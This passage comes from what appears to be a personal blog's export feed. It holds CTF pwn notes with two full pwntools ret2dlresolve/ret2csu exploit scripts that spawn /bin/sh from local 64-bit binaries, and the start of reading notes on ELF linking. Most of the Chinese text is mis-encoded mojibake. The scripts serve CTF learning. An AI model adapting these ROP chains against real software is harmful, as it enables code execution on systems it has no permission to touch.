</li><li>chlibcä¹‹åæ²¡æƒ³åˆ°<code>.dynamic</code>çš„åœ°å€éƒ½ä¼šæ”¹å˜, è°ƒè¯•äº†åŠå¤©ä¸çŸ¥é“ä¸ºä»€ä¹ˆè§£æä¸æˆåŠŸ, ç„¶åç›´æ¥åœ¨_dl_fixupä¸­çš„linkmapå‚æ•°æŸ¥å‡ºSTRTABçš„åœ°å€æ‰å‘ç°ä¸ä¸€æ ·äº†.</li><li>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯csuä½¿ç”¨çš„callçš„æ“ä½œæ•°æ˜¯å†…å­˜æ•°å€¼, æ‰€ä»¥ä¸èƒ½ä¼ å…¥è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€, è¿™é‡Œæ˜¯å…ˆæŠŠå®ƒå­˜åœ¨fake_stackä¸Š, ç„¶åè®¡ç®—å‡ºä»–çš„åœ°å€, å†å°†åœ°å€ä½œä¸ºcsu_callçš„å‚æ•°, å¯ä»¥è¯´ä¼ å…¥çš„æ˜¯<strong>ä¸€ä¸ªæŒ‡é’ˆçš„åœ°å€</strong>. </li></ul><p>expå¦‚ä¸‹, ä¸åŒç¼–è¯‘è¿è¡Œç¯å¢ƒä¸‹éœ€è¦æ›´æ”¹çš„æ˜¯: </p><ul><li>csu_front csu_end csuä½¿ç”¨çš„å¯„å­˜å™¨ </li><li>dyn_STRTAB_entryåœ°å€. </li><li>read_pltä¹Ÿå°±æ˜¯pltä¸­ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€. </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">bin</span> = <span class="hljs-string">&#x27;./norelro_64&#x27;</span><br>context.binary = elf = ELF(<span class="hljs-built_in">bin</span>)<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>p = process(<span class="hljs-built_in">bin</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br><br>csu_front = <span class="hljs-number">0x401298</span><br>csu_end = <span class="hljs-number">0x4012b2</span><br><span class="hljs-comment"># will take place 0x38+0x38+0x8=0x78 or 120 bytes space</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">csu_call</span>(<span class="hljs-params">pointer, edi, rsi, rdx, rsp=<span class="hljs-number">0</span></span>):</span><br>    <span class="hljs-comment"># rdi = edi = r12d</span><br>    <span class="hljs-comment"># rsi = r13</span><br>    <span class="hljs-comment"># rdx = r14</span><br>    <span class="hljs-comment"># rbx = 0, rbp = 1</span><br>    <span class="hljs-comment"># pop sequence: rbx rbp r12 r13 r14 r15</span><br>    payload = pack(csu_end)<br>    payload += flat([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, edi, rsi, rdx, pointer, csu_front])<br>    payload += flat([<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, rsp-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>)])<br>    <span class="hljs-keyword">return</span> payload<br><br>dyn_STRTAB_entry = <span class="hljs-number">0x3ff3e0</span><br>bss = elf.get_section_by_name(<span class="hljs-string">&#x27;.bss&#x27;</span>).header.sh_addr<br>stack_size = <span class="hljs-number">0x200</span><br>base = bss + stack_size + <span class="hljs-number">0x8</span><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;base = 0x%x&#x27;</span> % base)<br><br>rop = ROP(<span class="hljs-built_in">bin</span>)<br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">120</span>)<br>rop.raw(csu_call(read_got, <span class="hljs-number">0</span>, base, <span class="hljs-number">277</span>, rsp=base))<br>rop.raw(<span class="hljs-number">0x40118b</span>)   <span class="hljs-comment"># leave; ret;</span><br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span> * (<span class="hljs-number">256</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>log.success(<span class="hljs-string">f&#x27;migrate rop len: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rop.chain())&#125;</span>&#x27;</span>)<br>ss(rop.chain())<br><br>rop = ROP(<span class="hljs-built_in">bin</span>)<br>rop.raw(csu_call(read_got, <span class="hljs-number">0</span>, dyn_STRTAB_entry+<span class="hljs-number">8</span>, <span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&#x27;entry address: 0x%x&#x27;</span> % dyn_STRTAB_entry)<br><span class="hljs-comment"># base+269=rop.raw(read_plt) base+261=rop.raw(sh)</span><br>rop.raw(csu_call(base + <span class="hljs-number">269</span>, base + <span class="hljs-number">261</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).data()<br>dynstr = dynstr[:dynstr.find(<span class="hljs-string">b&#x27;read&#x27;</span>)+<span class="hljs-number">5</span>].replace(<span class="hljs-string">b&#x27;read&#x27;</span>, <span class="hljs-string">b&#x27;system&#x27;</span>)<br>log.success(<span class="hljs-string">f&#x27;dynstr is: <span class="hljs-subst">&#123;dynstr&#125;</span>&#x27;</span>)<br>rop.raw(dynstr)<br><span class="hljs-comment"># log.error(str(len(rop.chain())))</span><br>sh = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>rop.raw(sh)<br>read_plt = <span class="hljs-number">0x401066</span>  <span class="hljs-comment"># seconde instruction of read@plt</span><br>rop.raw(read_plt)<br><span class="hljs-comment"># log.error(f&#x27;len of rop: &#123;len(rop.chain())&#125;&#x27;) </span><br><br>gdb.attach(p)<br><span class="hljs-comment"># sleep(0.5)</span><br>ss(rop.chain())<br>ss(pack(base + <span class="hljs-number">240</span>))<br>itt()<br></code></pre></div></td></tr></table></figure><h4 id="64-Partial-RELRO"><a href="#64-Partial-RELRO" class="headerlink" title="64, Partial RELRO"></a>64, Partial RELRO</h4><p>64ä½ä¸‹å„ä¸ªç»“æ„ä½“çš„ä¸åŒåœ¨èƒŒæ™¯çŸ¥è¯†é‡Œæœ‰æåˆ°. </p><p>å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªé—®é¢˜æ˜¯64ä½ä¸‹æ ˆç©ºé—´çš„ä½¿ç”¨å¤§å¤§å¢åŠ , å¥½åœ¨ä¸€ä¸ªpageçš„bssæ®µè¿˜æ˜¯å¤Ÿç”¨çš„. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">bin</span> = <span class="hljs-string">&#x27;./partial_relro_64&#x27;</span><br>context.binary = elf = ELF(<span class="hljs-built_in">bin</span>)<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>p = process(<span class="hljs-built_in">bin</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br><br>csu_front = <span class="hljs-number">0x401298</span><br>csu_end = <span class="hljs-number">0x4012b2</span><br><span class="hljs-comment"># will take place 0x38+0x38+0x8=0x78 or 120 bytes space</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">csu_call</span>(<span class="hljs-params">pointer, edi=<span class="hljs-number">0</span>, rsi=<span class="hljs-number">0</span>, rdx=<span class="hljs-number">0</span>, rsp=<span class="hljs-number">0</span>, fir_arg=<span class="hljs-number">0</span>, sec_arg=<span class="hljs-number">0</span></span>):</span><br>    <span class="hljs-comment"># rdi = edi = r12d</span><br>    <span class="hljs-comment"># rsi = r13</span><br>    <span class="hljs-comment"># rdx = r14</span><br>    <span class="hljs-comment"># rbx = 0, rbp = 1</span><br>    <span class="hljs-comment"># pop sequence: rbx rbp r12 r13 r14 r15</span><br>    payload = pack(csu_end)<br>    payload += flat([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, edi, rsi, rdx, pointer, csu_front])<br>    <span class="hljs-keyword">if</span> rsp != <span class="hljs-number">0</span>:<br>        payload += flat([<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, rsp-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>)])<br>    <span class="hljs-keyword">else</span>:<br>        payload += flat([fir_arg, sec_arg, <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x10</span>)])<br>    <span class="hljs-keyword">return</span> payload<br><br>bss = elf.get_section_by_name(<span class="hljs-string">&#x27;.bss&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rela.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br>plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br><br>stack_size = <span class="hljs-number">0x400</span> + <span class="hljs-number">0x18</span>*<span class="hljs-number">110</span> -<span class="hljs-number">8</span><br>base = bss + stack_size<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;base = 0x%x&#x27;</span> % base)<br><br>rop = ROP(<span class="hljs-built_in">bin</span>)<br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">120</span>)<br>rop.raw(csu_call(read_got, <span class="hljs-number">0</span>, base, <span class="hljs-number">120</span>, rsp=base))<br>rop.raw(rop.leave.address)<br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span> * (<span class="hljs-number">256</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>log.success(<span class="hljs-string">f&#x27;migrate rop len: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rop.chain())&#125;</span>&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br>ss(rop.chain())<br><br>binsh_addr = base + <span class="hljs-number">72</span> + <span class="hljs-number">8</span><br>binsh = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>rel_idx = <span class="hljs-built_in">int</span>((base + <span class="hljs-number">48</span> - rel_plt) / <span class="hljs-number">0x18</span>)<br>pop_rdi = <span class="hljs-number">0x4012bb</span><br>rop = ROP(<span class="hljs-built_in">bin</span>)<br>rop.raw(pop_rdi)<br>rop.raw(binsh_addr)<br>rop.raw(plt)<br><br>rop.raw(rel_idx)<br>rop.raw(<span class="hljs-number">0</span>)      <span class="hljs-comment"># system_ret_addr</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br><span class="hljs-comment"># len is 48</span><br><br>fake_rel_addr = base + <span class="hljs-number">48</span><br><span class="hljs-comment"># log.success(hex(fake_rel_addr))</span><br><span class="hljs-comment"># fake_rel_addr += 0x18 - (fake_rel_addr - rel_plt) % 0x18    # add 0x8 bytes</span><br><span class="hljs-comment"># log.success(hex(fake_rel_addr))</span><br>fake_sym_addr = base + <span class="hljs-number">96</span><br><span class="hljs-comment"># fake_sym_addr += 0x18 - (fake_sym_addr - dynsym) % 0x18</span><br><span class="hljs-comment"># log.error(str(fake_rel_addr-rel_plt)+&#x27; &#x27;+str(fake_sym_addr-dynsym))</span><br><span class="hljs-comment"># log.error(str(fake_sym_addr-base)) # 96</span><br><br>r_offset = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_sym_idx = (fake_sym_addr - dynsym) / <span class="hljs-number">0x18</span><br>r_info = (<span class="hljs-built_in">int</span>(write_sym_idx) &lt;&lt; <span class="hljs-number">32</span>) | <span class="hljs-number">0x7</span><br>fake_write_rel = flat([r_offset, r_info, <span class="hljs-number">0</span>]) <span class="hljs-comment"># last is addend</span><br>rop.raw(fake_write_rel) <span class="hljs-comment"># len is 72</span><br><span class="hljs-comment"># log.error(str(len(rop.chain())))</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>rop.raw(binsh)<br>rop.raw(<span class="hljs-string">&#x27;system\x00&#x27;</span>)<br><br>rop.raw(<span class="hljs-string">&#x27;c&#x27;</span>*(<span class="hljs-number">96</span>-<span class="hljs-built_in">len</span>(rop.chain())))<br>st_name = (base + <span class="hljs-number">72</span> + <span class="hljs-number">16</span>) - dynstr<br>fake_write_sym = p32(st_name) + p16(<span class="hljs-number">0x12</span>) + p16(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>rop.raw(fake_write_sym)<br><span class="hljs-comment"># log.error(str(len(rop.chain()))) # 120</span><br><br>gdb.attach(p)<br>ss(rop.chain())<br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="QEMUé€ƒé€¸"><a href="#QEMUé€ƒé€¸" class="headerlink" title="QEMUé€ƒé€¸"></a>QEMUé€ƒé€¸</h2><ul><li><p>PCIæ˜¯ä¸ªå•¥</p><p><img src="../../image/CTF_supplement/pci-system.gif" alt="img"></p><ul><li><a href="https://developer.aliyun.com/article/559546">linuxä¸­pciè®¾å¤‡çŸ¥è¯†-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº</a> | <a href="http://www.embeddedlinux.org.cn/linuxkernel/tlk.html">The Linux Kernel - PCI</a> : ä¸å¤ªå…¨, æ²¡çœ‹æ‡‚. </li><li></li></ul></li></ul><h2 id="ç»éªŒæ±‡æ€»"><a href="#ç»éªŒæ±‡æ€»" class="headerlink" title="ç»éªŒæ±‡æ€»"></a>ç»éªŒæ±‡æ€»</h2><ul><li>è¢«dequeå¡ä½. çœ‹äº†STLä¹‹åç†Ÿæ‚‰äº†å¾ˆå¤š. ä¸‹æ¬¡é‡åˆ°set mutiset hashmapåˆå¾—å¡. ç®—äº†åˆ°æ—¶å€™å†è¯´. </li><li>ä»¥åå¯ä»¥å…ˆçœ‹çœ‹<code>.init_array</code>æ®µä¸­å‡ºç°çš„æ„é€ å‡½æ•°, çœ‹çœ‹æœ‰æ²¡æœ‰ç”¨çš„å…¨å±€å˜é‡æç¤º. å°±å¦‚è¿™é‡Œçš„<code>unkn_string_arr</code>. </li><li><strong>åŠ¨é™æ€ç›¸ç»“åˆ</strong>å¯ä»¥æ›´å¿«çš„çœ‹å‡ºä»£ç çš„æ„å›¾. å°±æ¯”å¦‚æœ€é‡è¦æ‰§è¡Œçš„ä»£ç åŒºåŸŸçš„æ ·å­, å‰é¢229å­—èŠ‚ç„¶åä¸€å †callæŒ‡ä»¤, ç›´æ¥è§‚å¯Ÿcallä»€ä¹ˆåœ°å€. </li><li>å‘ç°ä¸€æ¡è·¯å¾„èƒ½å¤Ÿé€šè¿‡ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®, é‚£å°±å»æƒ³èƒ½å¦æ”¹å˜æŒ‡é’ˆä»è€Œè¾¾åˆ°ä»»æ„å†™? </li><li>å¤šæ³¨æ„mallocå’Œfreeå‡½æ•°, delMaindåˆ†æå°±å†™å‡ ä¸ªå­—æ€ä¹ˆèƒ½ååº”å¾—åˆ°å‘¢.</li><li>å¸¸è§æ¼æ´:<ul><li>æ•´æ•°æº¢å‡º, æœ‰ç¬¦å·çš„æ¯”è¾ƒ</li><li>heapåˆ©ç”¨. å°±å¾ˆå¤šäº†. å¤šæ³¨æ„mallocå’Œfree</li><li>kernelä¸»è¦è¿˜æ˜¯é€»è¾‘æ¼æ´. </li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»-é“¾æ¥è£…è½½ä¸åº“ã€‹</title>
    <link href="/2022-05/Archive-%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/"/>
    <url>/2022-05/Archive-%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h2 id="1-2"><a href="#1-2" class="headerlink" title="1-2"></a>1-2</h2><p>æ²¡å•¥ç‰¹åˆ«çš„</p><h2 id="3-ELF"><a href="#3-ELF" class="headerlink" title="3 ELF"></a>3 ELF</h2><blockquote><p>COFF æ˜¯ç”± Unix System V Release 3 é¦–å…ˆæå‡ºå¹¶ä¸”ä½¿ç”¨çš„æ ¼å¼è§„èŒƒï¼Œåæ¥å¾®è½¯å…¬å¸åŸº äº COFF æ ¼å¼ï¼Œåˆ¶å®šäº† PE æ ¼å¼æ ‡å‡†ï¼Œå¹¶å°†å…¶ç”¨äºå½“æ—¶çš„ Windows NT ç³»ç»Ÿã€‚ System V Release 4 åœ¨ COFF çš„åŸºç¡€ä¸Šå¼•å…¥äº† ELF æ ¼å¼ï¼Œç›®å‰æµè¡Œçš„ Linux ç³»ç»Ÿä¹Ÿä»¥ ELF ä½œ ä¸ºåŸºæœ¬å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆç›®å‰ PE å’Œ ELF å¦‚æ­¤ç›¸ä¼¼çš„ä¸»è¦åŸå› </p></blockquote><p>æ®µ sectionï¼š</p><ul><li>å¦å¤–å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæœ‰æ—¶å€™ç¼–è¯‘å™¨ä¼šæŠŠå®ç¬¦ä¸²å¸¸é‡æ”¾åˆ° â€œ.dataâ€ æ®µï¼Œè€Œä¸ä¼šå•ç‹¬æ”¾åœ¨â€.rodataâ€ æ®µã€‚</li><li>â€ .note.GNU-stackâ€ æ®µè™½ç„¶æœ‰ â€œ CONTENTSâ€, ä½†å®ƒçš„é•¿åº¦ä¸º 0, è¿™æ˜¯ä¸ªå¾ˆå¤æ€ªçš„æ®µ</li><li>åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›éç³»ç»Ÿä¿ç•™çš„åå­—ä½œä¸ºæ®µå ã€‚ æ¯”å¦‚æˆ‘ä»¬å¯ä»¥åœ¨ ELF æ–‡ä»¶ä¸­æ’å…¥ä¸€ä¸ª â€œmusicâ€ çš„ æ®µï¼Œé‡Œé¢å­˜æ”¾äº†ä¸€é¦– MP3 éŸ³ä¹ï¼ŒèŠ‚ ELF æ–‡ä»¶è¿è¡Œèµ·æ¥ä»¥åå¯ä»¥è¯»å–è¿™ä¸ªæ®µæ’­æ”¾è¿™é¦– MP3. ä½†æ˜¯åº”ç”¨ç¨‹åºè‡ªå®šä¹‰çš„æ®µåä¸èƒ½ä½¿ç”¨â€œ.â€ä½œä¸ºå‰ç¼€ï¼Œå¦åˆ™å®¹æ˜“è·Ÿç³»ç»Ÿä¿ç•™æ®µåå†²çªã€‚</li><li>æ¯”å¦‚ä¸€ä¸ª ELF æ–‡ä»¶ä¸­å¯èƒ½æœ‰ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šå«åš â€œ.textâ€ çš„æ®µ</li><li>è‡ªå®šä¹‰æ®µ<ul><li><code>_attribute_( (section( &quot;FOO&quot;))) int global= 42;</code> </li></ul></li></ul><p>ELF:</p><ul><li>ELF æ®µè¡¨çš„è¿™ä¸ªæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æ— æ•ˆçš„æ®µæè¿°ç¬¦ï¼Œå®ƒçš„ç±»å‹ä¸º â€˜,NULLâ€, é™¤æ­¤ä¹‹å¤–æ¯ä¸ªæ®µ æè¿°ç¬¦éƒ½å¯¹åº”ä¸€ä¸ªæ®µ</li><li>ä¸»è¦å†³å®šæ®µçš„å±æ€§çš„æ˜¯æ®µçš„ç±»å‹ (<strong>sb_type</strong>) å’Œæ®µçš„æ ‡å¿—ä½ (<strong>sh_flags</strong>) P100</li><li>å¯¹äºå˜é‡å’Œå‡½æ•°æ¥è¯´ï¼Œç¬¦å·å€¼å°±æ˜¯å®ƒä»¬çš„åœ°å€</li><li>P108 ç¬¦å·è¡¨è¯¦ç»†ä»‹ç»<ul><li>é“¾æ¥å™¨ç‰¹æ®Šç¬¦å·! ç”¨externå£°æ˜. åœ¨ucoreä¸­ä¹Ÿè§è¿‡.</li></ul></li></ul><p>ç¼–è¯‘å™¨è¡Œä¸º:</p><ul><li>ç¬¦å·ä¿®é¥°ä¸å‡½æ•°ç­¾å, åŠ ä¸åŠ ä¸‹åˆ’çº¿çš„åŒºåˆ«.<ul><li>P111 C++å‡½æ•°ç­¾å.</li><li>binutilsä¸­<code>c++filt</code>å‘½ä»¤è§£æå‡½æ•°ç­¾å, çœŸè¡Œ</li><li>extern â€œCâ€çš„ä½œç”¨!</li><li>ç¡®å®æ˜¯æ¶¨çŸ¥è¯†.</li></ul></li><li>å¼ºå¼±å¼•ç”¨:<ul><li>é€šè¿‡ä½¿ç”¨ <code>&quot;_attribute_((weakref))&quot; </code>è¿™ä¸ªæ‰©å±•å…³é”®å­—æ¥å£°æ˜å¯¹ä¸€ ä¸ªå¤–éƒ¨å‡½æ•°çš„å¼•ç”¨ä¸ºå¼±å¼•ç”¨</li><li>è¿™ç§å¼±ç¬¦å·å’Œå¼±å¼•ç”¨å¯¹äºåº“æ¥è¯´ååˆ†æœ‰ç”¨ï¼Œæ¯”å¦‚åº“ä¸­å®šä¹‰çš„å¼±ç¬¦å·å¯ä»¥è¢«ç”¨æˆ·å®šä¹‰çš„å¼º ç¬¦å·æ‰€è¦†ç›–ï¼Œä»è€Œä½¿å¾—ç¨‹åºå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç‰ˆæœ¬çš„åº“å‡½æ•°ï¼›æˆ–è€…ç¨‹åºå¯ä»¥å¯¹æŸäº›æ‰©å±•åŠŸèƒ½æ¨¡å—çš„å¼•ç”¨å®šä¹‰ä¸ºå¼±å¼•ç”¨ï¼Œå½“æˆ‘ä»¬å°†æ‰©å±•æ¨¡å—ä¸ç¨‹åºé“¾æ¥åœ¨ä¸€èµ·æ—¶ï¼ŒåŠŸèƒ½æ¨¡å—å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼› å¦‚æœæˆ‘ä»¬å»æ‰äº†æŸäº›åŠŸèƒ½æ¨¡å—ï¼Œé‚£ä¹ˆç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸é“¾æ¥ï¼Œåªæ˜¯ç¼ºå°‘äº†ç›¸åº”çš„åŠŸèƒ½ï¼Œè¿™ä½¿å¾—ç¨‹åºçš„åŠŸèƒ½æ›´åŠ å®¹æ˜“è£å‰ªå’Œç»„åˆã€‚</li></ul></li><li><strong>DWARF</strong> ( Debug With Arbitrary Record Format)</li></ul><h2 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h2><p>å¯¹äºå¤šä¸ªè¾“å…¥ç›®æ ‡æ–‡ä»¶ï¼Œé“¾æ¥å™¨å°†ç›¸ä¼¼æ®µåˆå¹¶</p><p>æ•´ä¸ªé“¾æ¥è¿‡ç¨‹åˆ†ä¸¤æ­¥:</p><ul><li>æ‰«ææ‰€æœ‰çš„è¾“å…¥ç›®æ ‡æ–‡ä»¶ï¼Œå¹¶ä¸”è·å¾—å®ƒä»¬çš„å„ä¸ªæ®µçš„é•¿åº¦ã€ å±æ€§å’Œä½ç½®ï¼Œå¹¶ä¸”å°†è¾“å…¥ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨ä¸­æ‰€æœ‰çš„ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨æ”¶é›†èµ·æ¥ï¼Œç»Ÿâ€” æ”¾åˆ°ä¸€ä¸ªå…¨å±€ç¬¦å·è¡¨ã€‚</li><li>ä½¿ç”¨ä¸Šé¢ç¬¬ä¸€æ­¥ä¸­æ”¶é›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¯»å–è¾“å…¥æ–‡ä»¶ä¸­æ®µçš„æ•°æ®ã€é‡å®šä½ä¿¡æ¯ï¼Œäº•ä¸”è¿›è¡Œç¬¦å·è§£æä¸é‡å®šä½ã€è°ƒæ•´ä»£ç ä¸­çš„åœ°å€ç­‰</li></ul><p>ä¹Ÿå°±æ˜¯:</p><ul><li>é“¾æ¥å™¨æŒ‰ç…§å‰é¢ä»‹ç»çš„ç©ºé—´åˆ†é…æ–¹æ³•è¿›è¡Œåˆ†é…ï¼Œè¿™æ—¶å€™è¾“å…¥æ–‡ 